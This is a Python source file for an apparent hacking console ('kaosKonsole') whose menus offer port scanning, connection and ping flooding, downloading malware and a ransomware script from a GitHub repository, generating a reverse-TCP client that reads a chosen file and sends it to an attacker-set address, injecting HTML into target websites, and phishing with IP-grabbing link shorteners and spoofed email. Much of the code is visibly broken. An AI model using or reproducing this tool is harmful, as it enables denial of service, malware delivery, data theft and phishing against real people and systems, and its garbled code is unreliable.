import os
import nmap
import socket
import requests
import platform
import random
import string
from bs4 import BeautifulSoup
import shutil
import subprocess
import urllib.request
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

jan = platform.node()
jani09 = platform.system()
urrr = platform.architecture()
rur43 = platform.machine()
jp06 = platform.version()

defaultpath = os.path.abspath(__file__)

while True:  
    if jani09 == "Windows":
        os.system("title kaosKonsoleBerryBlast")
        os.system("color 0A")
    elif jani09 == "Linux":
        os.system("title kaosKonsoleLimeo")
        print("linux will be better supported soon")
    print("___________________________________________________________________")
    print("                            _    _                                 ")
    print("    /                       /  ,'                           /      ")
    print("---/-__----__----__---__---/_.'------__----__---__----__---/----__-")
    print("  /(     /   ) /   ) (_ ` /  \     /   ) /   ) (_ ` /   ) /   /___)")
    print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")

    print("Jan " + str(jan))
    print("OS: " + jani09)
    print("Machine: " + rur43)
    print("Vers. " + jp06)
    print(urrr)

    print("Exploit: e")
    print("Sniff connections within a range: sniff")
    print("Sniff IP + Port status: pingsniff")
    print("Flood IP + Port with connections: flood")
    print("Flood IP + Port with pings: pingflood")
    print("Pingoflood: pingoflood")
    print("Use pingo: pingo")
    print("Social engineering: soc")
                                                                   
    x1 = input("command: ")
    if x1 == "e":
        if jani09 == "Windows":
            os.system("color 0C")
        elif jani09 == "Linux":
            print("linux will be better supported soon")
        print("wowza")
        print("available:")
        print("inject")
        print("nmap")
        print("bruteforce")
        uri9 = input("command: ")
        p65 = input("Select an IP/Hostname: ")
        f34 = int(input("Select da port: "))
        if uri9 == "nmap":
            try:
                mike4 = input("nmap arguments: ")
                print("Starting nmap scan on: " + p65)
                print("Arguments: " + mike4)
                suli0 = nmap.PortScanner()
                suli0.scan(p65, arguments="-O")
                ja1 = suli0.scan(p65, arguments=mike4)
                print("^^ " + ja1['name'], ja1['accuracy'])
            except:
                print("@w@ " + p65)
            print("continue")
            print("getmeout")
            nancy76 = input("what now: ")
            if nancy76 == "continue":
                continue
            elif nancy76 == "getmeout":
                break
        elif uri9 == "bruteforce":
            try:
                socket.create_connection((p65, f34))
                print(str(p65) + ":" + str(f34) + " :3")
                print("exploit")
                print("getmeout")
                r43 = input("What now: ")
                if r43 == "exploit":
                    print("how to exploit??")
                    print("warning this will download some malwares if ur a fucking scrub maybe its not too safe to utilize some of these")
                    xb = input("exploit: ")
                    if xb == "infarox27":

                        print("based")
                        print("downloading infarox..")

                        url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27.EXE"
                        filename = defaultpath + "\\" + "infarox27.EXE"
                        urllib.request.urlretrieve(url, filename)

                        copied_file_path = os.path.join(defaultpath + "\\" + filename)
                        continue
                    elif xb == "MSS":
                        
                        print("$$$$")
                        print("downloading MSS..")

                        url = "https://github.com/kaosSec/kaosTools/raw/main/py/MSS.py"
                        filename = defaultpath + "\\" + "MSS.py"
                        urllib.request.urlretrieve(url, filename)

                        copied_file_path = os.path.join(defaultpath + "\\" + filename)
                        continue
                    elif xb == "PlorgBetterRansom":

                        print("thats rude")
                        print("downloading PlorgBetterRansom..")

                        url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/PlorgBetterRansom.vbs"
                        filename = defaultpath + "\\" + "Plorg.vbs"
                        urllib.request.urlretrieve(url, filename)

                        copied_fule_path = os.path.join(defaultpath + "\\" + filename)
                        continue

                    elif xb == "reverseTCP":

                        print("basic yawwwwwwn butyea")
                        print("Creating files..")
                        
                        jj78 = input("Enter local address: ")
                        m89 = input("Enter local port: ")
                        k34 = input("Enter data to send to target: ")
                        o57 = input("Extension for data saved to target: ")
                        riga70 = input("File to receive from target: ")

                        with open("localTCP.py", "w") as f:
                            w = f.write

                            w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")

                            w(f"server_address = ({jj78}, {m89})")
                            w("sock.bind(server_address)")

                            w("sock.listen(1)")

                            w("while True:")
                            w("    connection, client_address = sock.accept()")
                            w("    try:")
                                    
                            w("        data = connection.recv(1024)")
                            w(f"        message = {k34}")
                            w("        connection.sendall(message.encode())")
                            w("    except:")
                            w("        print("@w@")")
                            w("        continue")
                            w("    finally:")
                            w("        connection.close()")
                            os.system("python localTCP.py")
                        with open("uji67.py", "w") as f:
                            w = f.write

                            w(f"with open({riga70}, 'rb') as f:")
                            w(f"    {riga70} = f.read()")

                            w("sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")

                            w(f"server_address = ({jj78}, {m89})")
                            w("sock.connect(server_address)")

                            w("try:")
                            w(f"    message = str(os.system) + {riga70}")
                            w("    sock.sendall(message.encode())")

                            w("    data = sock.recv(1024)")
                            w("    print(f"'{data.decode()}'")")
                            w(f"    with open('runky.' + {o57}, 'w') as f:")
                            w("        f.write(data.decode())")
                                

                            w("finally:")
                            w("    sock.close()")

                            filename = "uji67.py"

                            continue

                    # pwn nubz
                    for i in range(1, 256):
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect(p65 + str(i))
                            shutil.copy2(filename, p65)
                            subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
                            print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
                            os.remove(filename)
                            
                        except:
                            print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
                            os.remove(filename)
                            pass
                    
                elif r43 == "getmeout":
                    exit
                else:
                    print("what")
                    exit
            except:
                print(str(p65) + " :/")

        elif uri9 == "inject":
                print("neat")
                print(" ") 
                print(" ")
                print(" ")
                print("requests")
                ml23 = input("method: ")
                if ml23 == "requests":
                    rita90 = p65
                    rita77 = print("website: " + rita90)
                    ron60 = input("element to inject to: ")
                    lenny44 = input("new tag: ")
                    morgi11 = input("content to inject: ")
                    test_cases = [
                        {
                            'website': rita90,
                            'element': ron60,
                            'tag': lenny44,
                            'content': 'This is a new paragraph.',
                        },
                        {
                            'website': rita90,
                            'element': 'p',
                            'tag': 'p',
                            'content': 'This is a new paragraph.',
                        },
                        {
                            'website': rita90,
                            'element': 'title',
                            'tag': 'title',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': 'body',
                            'tag': 'title',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': 'body',
                            'tag': 'div',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': 'body',
                            'tag': 'iframe',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': ron60,
                            'tag': 'title',
                            'content': 'New Title',
                        },
                        {
                            'website': rita90,
                            'element': 'img',
                            'tag': 'img',
                            'content': '',
                        },
                    ]
                    for test_case in test_cases:
                        try:
                            gh4 = test_case['website']
                            b234 = test_case['element']
                            m65 = test_case['tag']
                            v32 = test_case['content']
                            print("testing: " + gh4)
                            skivi = requests.get(gh4)
                            print(gh4 + " tested!")
                            rini = BeautifulSoup(skivi.content, 'html.parser')
                            print("testing: " + b234)
                            ravi13 = rini.find(b234)
                            print(b234 + " tested!")
                            print("testing: " + m65)
                            x07 = rini.new_tag(m65)
                            print(m65 + " tested!")
                            print("testing: " + v32)
                            x07.string = v32
                            print(v32 + " tested!")
                            print("finishing test..")
                            ravi13.append(x07)
                            print("test complete!")
                            print("injecting..")
                            jonah40 = requests.post(rita90, dta=str(sovi))
                            rova = requests.get(rita90)
                            sovi = BeautifulSoup(rova.content, 'html.parser')
                            blik34 = sovi.find(ron60)
                            x23 = sovi.new_tag(lenny44)
                            x23.string = morgi11
                            blik34.append(x23)
                            jonah40 = requests.post(rita90, dta=str(sovi))
                            print("injected!")
                        except:
                            print("wango")
                            break

    elif x1 == "flood":
        stop = False
        while not stop:
            print("OWO")
            l34 = input("Select an IP: ")
            m21 = int(input("Select da port: "))
            if l34 == "99":
                stop = True
                break

            while True:
                try:
                    socket.create_connection(l34, m21)
                    print(str(l34) + str(m21) + " +1")
                except:
                    print(str(l34) + str(m21) + " +0")
                    break

    elif x1 == "pingflood":
        ports = []
        stop = False
        while not stop:
            print("X3")
            print("Options:")
            print("-r to specify range")
            j44 = input("Select an IP: ")
            nuji324 = input("Number of requests: ")
            if "-r" in j44:
                m77 = int(input("Select da port range: "))
                julie26 = list(map(int, m77.split()))
                ports.extend(julie26)
                if j44 == "99":
                    stop = True
                    break
                for port in ports:
                    print(port )
                    while True:
                        try:
                            jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
                            with open (jar44, "w") as f:
                                w = f.write
                                w("import os")
                                w(f"mh43 = ['ping -n ' + {nuji324} + ' ' + {j44}]")
                                w("os.system(' '.join(mh43))")
                                w("os.remove(__file__)")
                            os.system("python " + jar44)
                        except:
                            print(str(j44) + str(port) + " +0")

            else:
                if j44 == "99":
                    stop = True
                    break

                while True:
                    try:
                        jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
                        with open (jar44, "w") as f:
                            w = f.write
                            w("import os")
                            w(f"mh43 = ['ping -n ' + {nuji324} + ' ' + {j44}]")
                            w("os.system(' '.join(mh43))")
                            w("os.remove(__file__)")
                        os.system("python " + jar44)
                    except:
                        print(str(j44) + " +0")
                        continue

    elif x1 == "pingoflood":
        ports = []
        stop = False
        while not stop:
            print("boingboinnggggboing")
            j342 = input("HOSTNAME: ")
            m13 = input("REQUESTS: ")
            l56 = input("CONNECTIONS: ")
            m32 = input("HOSPORT: ")
            print("Options:")
            print("-r to specify range")
            nuji324 = input("Number of requests: ")
            if "-r" in j342:
                m77 = int(input("Select da port range: "))
                julie26 = list(map(int, m77.split()))
                ports.extend(julie26)
                if j342 == "99":
                    stop = True
                    break
                for port in ports:
                    print(port )
                    while True:
                        try:
                            jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
                            with open (jar44, "w") as f:
                                w = f.write
                                w("import os")
                                w("import subprocess")
                                w("try:")
                                w("    output = subprocess.check_output(['ruby', '--version'], stderr=subprocess.STDOUT)")
                                w(f"    subprocess.Popen(['ruby', 'pingo.rb', '-n' , {m13}, '-c', {l56}, '-h', {j342}, '-p', {m32}], stdout=subprocess.PIPE, stderr=subprocess.PIPE)")
                                w("os.remove(__file__)")
                            print("+" + jar44)
                            os.system("python " + jar44)
                            print(str(j342) + " +1")
                        except:
                            print(str(j342) + str(port) + " +0")

            else:
                if j342 == "99":
                    stop = True
                    break

                while True:
                    try:
                        jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
                        with open (jar44, "w") as f:
                            w = f.write
                            w("try:")
                            w("    output = subprocess.check_output(['ruby', '--version'], stderr=subprocess.STDOUT)")
                            w(f"    subprocess.Popen(['ruby', 'pingo.rb', '-n' , {m13}, '-c', {l56}, '-h', {j342}, '-p', {m32}], stdout=subprocess.PIPE, stderr=subprocess.PIPE)")
                            w("os.remove(__file__)")
                        os.system("python " + jar44)
                        print("+" + jar44)
                        print(str(j342) + " +1")
                    except:
                        print(str(j342) + " +0")
                        continue 

    elif x1 == "sniff":
        print("yowza")
        ports = []
        stop = False
        while not stop:
            print("sniff....sniffsniff........")
            roko99 = input("Select an IP: ")
            pk56 = input("Select da port range: ")
            jodie34 = list(map(int, pk56.split()))
            ports.extend(jodie34)
            if roko99 == "99":
                stop = True
                break

            for port in ports:
                try:
                    socket.create_connection((roko99, port))
                    print(str(port) + " ^^")
                except:
                    print(str(port) + " @w@")

    elif x1 == "pingsniff":
        print("hehehe")
        print("sniff...snifssnsifffff.......")
        ports = []
        stop = False
        while not stop:
            jorn79 = input("Select an IP: ")
            jm23 = input("Select da port range: ")
            joyce80 = list(map(int, jm23.split()))
            ports.extend(joyce80)
            if jorn79 == "99":
                stop = True
                break

            for port in ports:
                try:
                    os.system("ping " + jorn79 + port)
                    print(str(port) + " ^^")
                except:
                    print(str(port) + " @w@")

    elif x1 == "pingo":
        print("boing")
        m13 = input("REQUESTS: ")
        l56 = input("CONNECTIONS: ")
        j342 = input("HOSTNAME: ")
        m32 = input("HOSPORT: ")
        try:
            output = subprocess.check_output(['ruby', '--version'], stderr=subprocess.STDOUT)
            p = subprocess.Popen(['ruby', 'pingo.rb', '-n' , m13, '-c', l56, '-h', j342, '-p', m32], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            o4 = p.stdout.read()
            print(o4)
            v3 = p.stderr.read()
            print(v3)
        except subprocess.CalledProcessError:
            print("u dont got that")
            continue
        except FileNotFoundError:
            print("u dont got that")
            continue

    elif x1 == "soc":
        if jani09 == "Windows":
            os.system("cls")
            os.system("color 03")
            os.system("title evileye")
        elif jani09 == "Linux":
            os.system("cls")
            print("linux will be better supported soon")
            os.system("title evileye")
        print("                             ▒▒▒▒▓▓▒▒▒▒▓▓▒▒░░                         ")
        print("                      ▓▓▒▒▒▒▒▒░░▓▓░░▒▒▒▒░░▓▓▓▓▒▒▓▓                    ")
        print("                  ░░░░░░░░▒▒    ▒▒  ░░    ░░▒▒▒▒▒▒▓▓▒▒░░              ")
        print("              ░░░░░░                    ░░▒▒░░░░░░░░▒▒▓▓▒▒░░          ")
        print("            ░░░░░░                          ░░    ░░░░▒▒░░▓▓          ")
        print("          ░░░░░░                  ░░▒▒░░            ░░▒▒▒▒▒▒▓▓        ")
        print("        ░░░░░░░░                    ░░                ░░▒▒░░▒▒▒▒      ")
        print("        ░░░░                                      ▒▒    ▒▒░░░░░░      ")
        print("      ░░░░░░    ░░                                        ▒▒▒▒░░      ")
        print("    ░░░░░░░░        ░░                                      ▒▒░░░░    ")
        print("    ░░░░░░░░    ▒▒  ▒▒      ░░▒▒▓▓▓▓▓▓▒▒▒▒░░        ▒▒  ▒▒░░░░▓▓░░░░  ")
        print("  ░░░░░░  ░░      ▓▓  ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░  ░░░░░░░░░░░░░░░░░░  ")
        print("  ░░░░                ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒░░  ▒▒░░        ░░░░░░")
        print("  ░░░░                ▒▒▒▒▒▒░░░░░░░░▒▒▒▒░░  ░░▒▒▒▒  ░░          ▒▒░░░░")
        print("  ░░            ░░  ▒▒▒▒▒▒▒▒░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░            ░░░░░░")
        print("░░▒▒            ░░  ▒▒▒▒▒▒▒▒░░░░████▒▒██▒▒▒▒▒▒▒▒▒▒▒▒              ░░░░")
        print("▒▒                  ▒▒▒▒▒▒▒▒░░▒▒████  ██▓▓▒▒▒▒▒▒▒▒▒▒          ░░  ░░░░")
        print("░░░░        ▒▒      ▒▒░░▒▒▒▒▒▒▓▓██████████▒▒▒▒▒▒▒▒▒▒            ░░░░░░")
        print("░░░░░░      ▒▒  ▒▒  ▒▒░░░░▒▒▒▒▓▓██████████░░▒▒▒▒▒▒▒▒  ░░        ░░▒▒░░")
        print("░░░░            ░░  ▒▒░░░░  ░░▒▒▓▓██████░░░░▒▒▒▒▓▓▒▒  ░░░░        ░░░░")
        print("░░▒▒            ░░  ░░▒▒▒▒░░░░░░▒▒▒▒▒▒░░░░░░░░▒▒▒▒░░            ░░░░░░")
        print("  ░░░░░░░░            ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒░░          ░░▒▒▒▒░░")
        print("  ▒▒░░░░              ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒          ░░░░░░░░░░")
        print("  ▒▒░░▒▒░░            ▒▒░░▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒            ░░▒▒░░░░  ")
        print("    ░░▒▒▒▒░░░░        ░░    ▒▒▓▓▒▒▒▒▒▒▒▒▒▒░░              ░░  ░░░░░░  ")
        print("    ░░▓▓▒▒▒▒░░          ▒▒                                ░░░░░░░░    ")
        print("      ▒▒▓▓░░░░░░░░░░░░▒▒  ░░░░                            ░░░░░░      ")
        print("        ░░░░░░▒▒▒▒▒▒  ▒▒                                ░░  ░░        ")
        print("          ▒▒▒▒▒▒▒▒░░░░░░                              ▒▒░░░░░░        ")
        print("            ░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒            ░░░░░░    ░░░░░░░░          ")
        print("                ▓▓░░▒▒░░░░░░▒▒░░  ░░  ░░░░░░▒▒░░░░░░░░░░░░            ")
        print("                  ░░▒▒▒▒▒▒░░▓▓▒▒▒▒░░░░▒▒░░░░░░░░░░░░                  ")
        print("                        ▒▒▓▓▓▓▒▒▓▓▒▒░░░░░░░░░░                        ")

        print(" ")
        print(" ")
        
        print(" ")
        print(" ")
        print("website")
        print("email")
        print(" ")
        print(" ")

        jj34 = input("Select a method for social engineering: ")
        if jj34 == "website":
            print("Which website method?")
            print(" ")
            print("host")
            print("inject")
            jo4 = input(" ")
            if jo4 == "host":
                    print("Would you like to download HTML presets?")
                    jk23 = input("Y/N: ")
                    if jk23 == "Y":
                        print("Downloading HTML presets..")

                        url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp1.html"
                        filename = defaultpath + "\\" + "htmldp1.html"
                        urllib.request.urlretrieve(url, filename)

                        url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp2.html"
                        filename = defaultpath + "\\" + "htmldp2.html"
                        urllib.request.urlretrieve(url, filename)
                        continue
                    elif jk23 == "N":
                        continue

                    print("How would you like to host the website?")
                    print("github")
                    mon4 = input(" ")
                    if mon4 == "github":
                        os.sytem("start https://github.com/new")
                        print(" ")
                        print(" ")
                        print("using github is pretty simple because of https://pages.github.com")
                        print("join https://github.com/kaosSec, create your own organization, or have github pro and you can utilize this method")
                        print(" ")
                        print(" ")
                        print("What link shortener?")
                        print(" ")
                        print("grabify")
                        print("t.ly")
                        print(" ")
                        j61 = input(" ")
                        if j61 == "grabify":
                            print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
                            print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
                            print(" #       #     # #     # #        #   #  #     #    # # # #  #   #  #       #  #  #  #   #  #     # #       ### ### ")
                            print("  #####  ######  ######  #####   #     # #     #    #  #  # #     # #       #  #  # #     # ######  #####    #   #  ")
                            print("       # #       #   #   #       ####### #     #    #     # ####### #       #  #  # ####### #   #   #               ")
                            print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
                            print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")                                                                           
                            os.system("start https://grabify.link")
                        elif j61 == "t.ly":
                            print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
                            print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
                            print(" #       #     # #     # #        #   #  #     #    # # # #  #   #  #       #  #  #  #   #  #     # #       ### ### ")
                            print("  #####  ######  ######  #####   #     # #     #    #  #  # #     # #       #  #  # #     # ######  #####    #   #  ")
                            print("       # #       #   #   #       ####### #     #    #     # ####### #       #  #  # ####### #   #   #               ")
                            print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
                            print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")      
                            os.system("start https://t.ly/")
            elif jo4 == "inject":
                print("neat")
                print(" ") 
                print(" ")
                print(" ")
                print("requests")
                ml23 = input("method: ")
                if ml23 == "requests":
                    rita90 = input("website: ")
                    ron60 = input("element to inject to: ")
                    lenny44 = input("new tag: ")
                    morgi11 = input("content to inject: ")
                    test_cases = [
                        {
                            'website': rita90,
                            'element': ron60,
                            'tag': lenny44,
                            'content': 'This is a new paragraph.',
                        },
                        {
                            'website': rita90,
                            'element': 'p',
                            'tag': 'p',
                            'content': 'This is a new paragraph.',
                        },
                        {
                            'website': rita90,
                            'element': 'title',
                            'tag': 'title',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': 'body',
                            'tag': 'title',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': 'body',
                            'tag': 'div',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': 'body',
                            'tag': 'iframe',
                            'content': 'waga baga',
                        },
                        {
                            'website': rita90,
                            'element': ron60,
                            'tag': 'title',
                            'content': 'New Title',
                        },
                        {
                            'website': rita90,
                            'element': 'img',
                            'tag': 'img',
                            'content': '',
                        },
                    ]
                    for test_case in test_cases:
                        try:
                            gh4 = test_case['website']
                            b234 = test_case['element']
                            m65 = test_case['tag']
                            v32 = test_case['content']
                            print("testing: " + gh4)
                            skivi = requests.get(gh4)
                            print(gh4 + " tested!")
                            rini = BeautifulSoup(skivi.content, 'html.parser')
                            print("testing: " + b234)
                            ravi13 = rini.find(b234)
                            print(b234 + " tested!")
                            print("testing: " + m65)
                            x07 = rini.new_tag(m65)
                            print(m65 + " tested!")
                            print("testing: " + v32)
                            x07.string = v32
                            print(v32 + " tested!")
                            print("finishing test..")
                            ravi13.append(x07)
                            print("test complete!")
                            print("injecting..")
                            jonah40 = requests.post(rita90, dta=str(sovi))
                            rova = requests.get(rita90)
                            sovi = BeautifulSoup(rova.content, 'html.parser')
                            blik34 = sovi.find(ron60)
                            x23 = sovi.new_tag(lenny44)
                            x23.string = morgi11
                            blik34.append(x23)
                            jonah40 = requests.post(rita90, dta=str(sovi))
                            print("injected!")
                        except:
                            print("wango")
                            break
        elif jj34 == "email":
            try:
                loji35 = input("Email from: ")
                nn32 = input("Email to: ")
                kl1 = input("Email subject: ")
                u64 = input("Email body: ")
                uo7 = input("SMTP Server: ")
                rr3 = int(input("SMTP Port: "))
                r343 = input("SMTP Username: ")
                uyy8 = input("SMTP Password: ")

                iu75 = loji35
                sm35 = nn32
                kjr99 = kl1
                jj9 = u64

                msg = MIMEMultipart()
                msg['From'] = iu75
                msg['To'] = sm35
                msg['Subject'] = kjr99
                msg.attach(MIMEText(jj9, 'plain'))

                rox9 = uo7
                smmms1 = rr3
                tpU84 = r343
                pppp = uyy8
                server = smtplib.SMTP(rox9, smmms1)
                server.starttls()
                server.login(tpU84, pppp)

                server.sendmail(loji35, nn32, msg.as_string())
                server.quit()
                print("Sent!")
                continue
            except:
                print("@w@")
                continue

    elif x1 == jani09:

        time.sleep(4)
                
    elif x1 == "3":
        print("bowza")
    elif x1 == "4":
        print("lowza")
    elif x1 == "99":
        print("bai :3")
        os.system("cls")
        exit()
    else:
        print("??")
